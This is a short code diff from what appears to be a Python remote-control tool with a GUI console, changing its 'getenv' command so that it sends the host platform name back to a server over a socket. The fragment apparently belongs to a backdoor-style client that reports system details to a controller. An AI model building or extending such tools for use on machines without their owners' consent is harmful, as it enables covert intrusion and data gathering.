@@ -45,7 +45,7 @@ def commands():
         ui.console_textEdit.append("[+] close ====== > disconnect from the server")
         ui.console_textEdit.append("[+] getenv ====== > send the environment back to the server, //not working")
 
-    if 'send' in command:
+    if 'getenv' in command:
         sock.send( "[+] Platform Is " + platform.platform()) 
 
     if 'close' in command:
